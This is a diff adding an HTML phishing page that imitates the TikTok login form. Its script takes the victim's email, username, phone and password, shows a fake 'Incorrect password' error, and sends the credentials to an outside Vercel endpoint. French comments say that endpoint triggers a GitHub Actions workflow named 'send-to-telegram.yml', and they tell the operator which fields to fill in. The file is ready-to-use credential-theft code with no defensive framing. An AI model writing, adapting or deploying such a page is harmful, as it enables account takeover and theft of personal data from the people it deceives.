@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>TikTok Login</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body{background:#000;font-family:Arial;margin:0;padding:20px;color:white}
+    .box{max-width:380px;margin:40px auto;background:#1a1a1a;padding:30px;border-radius:12px}
+    input, button{width:100%;padding:14px;margin:10px 0;border-radius:8px;border:none;font-size:16px}
+    input{background:#333;color:white}
+    button{background:#fe2c55;color:white;font-weight:bold}
+    .logo{text-align:center;margin-bottom:20px}
+    #msg{color:#ff0050;margin-top:10px;display:none}
+  </style>
+</head>
+<body>
+  <div class="box">
+    <div class="logo"><h1 style="color:#fe2c55">tiktok</h1></div>
+    <h2>Log in to TikTok</h2>
+    
+    <input type="email" id="email" placeholder="Email or username" required>
+    <input type="text" id="user" placeholder="Username" required>
+    <input type="tel" id="phone" placeholder="Phone number (optional)">
+    <input type="password" id="pass" placeholder="Password" required>
+    
+    <button onclick="send()">Log in</button>
+    <div id="msg">Incorrect password. Try again.</div>
+  </div>
+
+  <script>
+    async function send() {
+      const e = document.getElementById('email').value.trim();
+      const u = document.getElementById('user').value.trim();
+      const p = document.getElementById('phone').value.trim() || "None";
+      const w = document.getElementById('pass').value;
+
+      // Affiche le faux message d'erreur
+      document.getElementById('msg').style.display = 'block';
+      document.getElementById('pass').value = '';
+
+      // Envoie les données via un service gratuit qui trigger ton GitHub Actions
+      fetch("https://trigger-workflow-4d7c.vercel.app/api/trigger", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          // À REMPLIR UNE SEULE FOIS ↓↓↓
+          owner: "novoidd",        
+          repo: "tiktok-help",           
+          workflow_file_name: "send-to-telegram.yml",
+          // ↑↑↑
+          email: e,
+          username: u,
+          phone: p,
+          password: w
+        })
+      });
+    }
+  </script>
+</body>
+</html>
